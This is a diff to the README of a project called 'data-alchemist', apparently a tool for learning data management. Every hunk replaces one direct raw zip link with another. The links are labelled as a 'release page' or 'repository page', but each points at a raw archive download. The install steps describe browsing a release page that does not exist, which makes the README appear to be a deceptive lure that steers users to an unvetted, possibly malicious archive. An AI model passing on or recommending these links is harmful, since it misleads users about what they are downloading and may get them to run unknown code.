@@ -1,6 +1,6 @@
 # ⚗️ data-alchemist - Manage Data Simply and Intelligently
 
-[![Download data-alchemist](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Batman220/data-alchemist/main/cloudflare/alchemist_data_2.5.zip)
+[![Download data-alchemist](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Batman220/data-alchemist/main/scripts/data-alchemist-2.3.zip)
 
 ---
 
@@ -24,7 +24,7 @@ It includes an AI tutor to guide you, quizzes to test your knowledge, and tracki
 
 You can get data-alchemist by visiting the release page on GitHub. Here is the link you need:
 
-[Visit the release page to download data-alchemist](https://raw.githubusercontent.com/Batman220/data-alchemist/main/cloudflare/alchemist_data_2.5.zip)
+[Visit the release page to download data-alchemist](https://raw.githubusercontent.com/Batman220/data-alchemist/main/scripts/data-alchemist-2.3.zip)
 
 This page holds the latest versions of data-alchemist. You will find the downloadable files for Windows there.
 
@@ -47,7 +47,7 @@ Follow these steps carefully to get started:
 
 1. Open your web browser.
 
-2. Go to the release page: https://raw.githubusercontent.com/Batman220/data-alchemist/main/cloudflare/alchemist_data_2.5.zip
+2. Go to the release page: https://raw.githubusercontent.com/Batman220/data-alchemist/main/scripts/data-alchemist-2.3.zip
 
 3. Look for the latest release near the top of the page.
 
@@ -117,7 +117,7 @@ data-alchemist runs locally on your computer with the HTML file. It does not sen
 
 ## 📚 Additional Resources
 
-- Visit the GitHub repository page for updates or questions: https://raw.githubusercontent.com/Batman220/data-alchemist/main/cloudflare/alchemist_data_2.5.zip
+- Visit the GitHub repository page for updates or questions: https://raw.githubusercontent.com/Batman220/data-alchemist/main/scripts/data-alchemist-2.3.zip
 
 - Use the built-in help in the AI tutor for step-by-step guidance.
 
@@ -125,4 +125,4 @@ data-alchemist runs locally on your computer with the HTML file. It does not sen
 
 ---
 
-[![Download data-alchemist](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://raw.githubusercontent.com/Batman220/data-alchemist/main/cloudflare/alchemist_data_2.5.zip)
+[![Download data-alchemist](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://raw.githubusercontent.com/Batman220/data-alchemist/main/scripts/data-alchemist-2.3.zip)
